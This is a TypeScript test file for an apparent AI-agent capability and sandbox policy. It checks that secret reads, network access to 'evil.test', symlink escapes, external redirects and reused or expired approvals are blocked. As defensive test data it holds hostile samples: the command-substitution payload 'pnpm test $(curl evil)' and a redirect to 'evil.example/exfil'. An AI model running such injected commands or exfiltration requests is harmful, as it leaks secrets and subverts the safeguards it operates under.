import { randomUUID } from "node:crypto";
import { mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  appendCapabilityAuditEvent,
  assertMcpConfirmationScope,
  assertTrustedCapabilityEvidence,
  authorizeCapability,
  checkPathWithinAllowedRoots,
  createCapabilityApproval,
  createDefaultCapabilityPolicy,
  createSafeCommandPolicy,
  detectShellSubstitution,
  enforceSandboxPolicy,
  evaluateProcessIsolation,
  fetchWithoutExternalRedirect,
  resetCapabilityApprovalSessionsForTests,
  resolveCapabilityAuditPath,
  runConfiguredCommand,
  validateNetworkDestination
} from "../src/index";

const tempRoots: string[] = [];

afterEach(() => {
  resetCapabilityApprovalSessionsForTests();
  for (const root of tempRoots.splice(0)) {
    rmSync(root, { recursive: true, force: true });
  }
});

describe("UAT capability policy (#690)", () => {
  it("UAT-SECURITY-1: malicious secret read + upload capabilities are denied and audited", () => {
    const cwd = createTempDir();
    const secret = authorizeCapability({
      capability: "secret.env",
      intent: { source: "agent" },
      policy: {
        version: 1,
        allow: [{ capability: "secret.env", secrets: ["AWS_SECRET_ACCESS_KEY"] }]
      },
      secrets: ["AWS_SECRET_ACCESS_KEY"]
    });
    const network = authorizeCapability({
      capability: "network",
      intent: { source: "memory" },
      policy: {
        version: 1,
        allow: [{ capability: "network", hosts: ["evil.test"] }]
      },
      hosts: ["evil.test"]
    });

    expect(secret.allowed).toBe(false);
    expect(network.allowed).toBe(false);

    appendCapabilityAuditEvent({
      cwd,
      phase: "denied",
      capability: "secret.env",
      intentSource: "agent",
      decision: "deny",
      reason: secret.reason
    });
    appendCapabilityAuditEvent({
      cwd,
      phase: "denied",
      capability: "network",
      intentSource: "memory",
      decision: "deny",
      reason: network.reason
    });

    const audit = readFileSync(resolveCapabilityAuditPath(cwd), "utf8");
    expect(audit).toContain('"phase":"denied"');
    expect(audit).toContain("secret.env");
    expect(audit).toContain("network");
  });

  it("UAT-SECURITY-2: generated experiment shell substitution is rejected before execution", async () => {
    expect(detectShellSubstitution("pnpm test $(curl evil)")).toContain("command substitution");
    const result = await runConfiguredCommand({
      command: "pnpm test $(curl evil)",
      cwd: createTempDir(),
      timeoutMs: 1000,
      safety: { allowCommands: true },
      capabilityIntentSource: "generated-experiment"
    });
    expect(result.status).toBe("blocked");
  });

  it("UAT-SECURITY-3: symlinked output path cannot escape allowed artifact directory", () => {
    const root = createTempDir();
    const allowed = join(root, "artifacts");
    const outside = join(root, "outside");
    mkdirSync(allowed, { recursive: true });
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(outside, "secret.txt"), "secret", "utf8");
    const link = join(allowed, "escape");
    symlinkSync(outside, link);

    const check = checkPathWithinAllowedRoots(join(link, "secret.txt"), [allowed], root);
    expect(check.allowed).toBe(false);
    expect(check.reason).toContain("escapes allowed roots");
  });

  it("UAT-SECURITY-4: allowed local HTTP target redirecting externally is blocked", async () => {
    const server = await createRedirectServer("https://evil.example/exfil");
    try {
      await expect(
        fetchWithoutExternalRedirect(server.url, { allowedHosts: ["127.0.0.1"] })
      ).rejects.toThrow(/not allowlisted|blocked/i);
    } finally {
      await server.close();
    }

    expect(
      validateNetworkDestination("http://127.0.0.1/health", { allowedHosts: ["127.0.0.1"] }).allowed
    ).toBe(true);
  });

  it("UAT-SECURITY-5: approved command runs only with exact scope and expires after consume/session", async () => {
    const cwd = createTempDir();
    const sessionId = "session-uat-5";
    const command = "node -e \"console.log('approved')\"";
    const approval = createCapabilityApproval({
      sessionId,
      capability: "command.execute",
      command,
      ttlMs: 60_000,
      singleUse: true
    });

    const first = await runConfiguredCommand({
      command,
      cwd,
      timeoutMs: 1000,
      safety: createSafeCommandPolicy({ allowCommands: true }),
      capabilityApproval: { sessionId, approvalId: approval.id }
    });
    expect(first.status).toBe("passed");

    const reused = await runConfiguredCommand({
      command,
      cwd,
      timeoutMs: 1000,
      safety: createSafeCommandPolicy({ allowCommands: true }),
      capabilityApproval: { sessionId, approvalId: approval.id }
    });
    expect(reused.status).toBe("blocked");
    expect(reused.blockedReason).toContain("already consumed");

    const other = createCapabilityApproval({
      sessionId,
      capability: "command.execute",
      command: "node -e \"console.log('other')\"",
      ttlMs: 60_000
    });
    const mismatch = await runConfiguredCommand({
      command,
      cwd,
      timeoutMs: 1000,
      safety: createSafeCommandPolicy({ allowCommands: true }),
      capabilityApproval: { sessionId, approvalId: other.id }
    });
    expect(mismatch.status).toBe("blocked");
    expect(mismatch.blockedReason).toContain("command scope mismatch");

    const expired = createCapabilityApproval({
      sessionId,
      capability: "command.execute",
      command,
      expiresAt: "2020-01-01T00:00:00.000Z"
    });
    const expiredRun = await runConfiguredCommand({
      command,
      cwd,
      timeoutMs: 1000,
      safety: createSafeCommandPolicy({ allowCommands: true }),
      capabilityApproval: {
        sessionId,
        approvalId: expired.id,
        now: new Date("2026-08-06T00:00:00.000Z")
      }
    });
    expect(expiredRun.status).toBe("blocked");
    expect(expiredRun.blockedReason).toContain("expired");
  });

  it("UAT-SECURITY-6: fake agent/tool claims cannot forge verified evidence", () => {
    expect(assertTrustedCapabilityEvidence({ source: "agent", claim: "verified" }).trusted).toBe(false);
    expect(assertTrustedCapabilityEvidence({ source: "mcp", claim: "passed" }).trusted).toBe(false);
    expect(assertTrustedCapabilityEvidence({ source: "model", claim: "safe" }).trusted).toBe(false);
    expect(assertTrustedCapabilityEvidence({ source: "user-config", claim: "verified" }).trusted).toBe(true);
  });

  it("UAT-SECURITY-7: CLI/MCP/loop share the same authorizeCapability decisions", () => {
    const policy = createDefaultCapabilityPolicy();
    const request = {
      capability: "network" as const,
      intent: { source: "user-config" as const },
      policy,
      hosts: ["example.com"]
    };
    const cli = authorizeCapability(request);
    const mcp = authorizeCapability(request);
    const loop = authorizeCapability(request);
    expect(cli).toEqual(mcp);
    expect(mcp).toEqual(loop);
    expect(cli.allowed).toBe(false);
  });

  it("MCP confirmation scope cannot authorize an unrelated later tool", () => {
    const approval = createCapabilityApproval({
      sessionId: "mcp-session",
      capability: "command.execute",
      command: "pnpm test",
      toolName: "run_configured_checks"
    });
    expect(assertMcpConfirmationScope(approval, "run_configured_checks", "command.execute").allowed).toBe(true);
    expect(assertMcpConfirmationScope(approval, "product_run", "command.execute").allowed).toBe(false);
  });

  it("sandbox required degrades to blocked instead of silent full access", () => {
    const isolation = evaluateProcessIsolation();
    expect(isolation.weakerIsolation).toBe(true);

    const required = enforceSandboxPolicy("required");
    expect(required.allowed).toBe(false);
    expect(required.reason).toContain("degrading to blocked");

    const decision = authorizeCapability({
      capability: "command.execute",
      intent: { source: "user-config", allowCommands: true },
      policy: { version: 1, allow: [], sandbox: "required" },
      command: "node -e \"console.log(1)\""
    });
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain("degrading to blocked");

    const bestEffort = enforceSandboxPolicy("best-effort");
    expect(bestEffort.allowed).toBe(true);
    expect(bestEffort.reason).toContain("weaker isolation");
  });
});

function createTempDir(): string {
  const root = join(tmpdir(), `codedecay-capability-uat-${randomUUID()}`);
  mkdirSync(root, { recursive: true });
  tempRoots.push(root);
  return root;
}

function createRedirectServer(location: string): Promise<{ url: string; close: () => Promise<void> }> {
  return new Promise((resolve, reject) => {
    const server = createServer((_request, response) => {
      response.writeHead(302, { Location: location });
      response.end();
    });
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (!address || typeof address === "string") {
        reject(new Error("Failed to bind redirect server"));
        return;
      }
      resolve({
        url: `http://127.0.0.1:${address.port}/`,
        close: async () =>
          await new Promise<void>((closeResolve, closeReject) => {
            server.close((error) => {
              if (error) {
                closeReject(error);
                return;
              }
              closeResolve();
            });
          })
      });
    });
  });
}
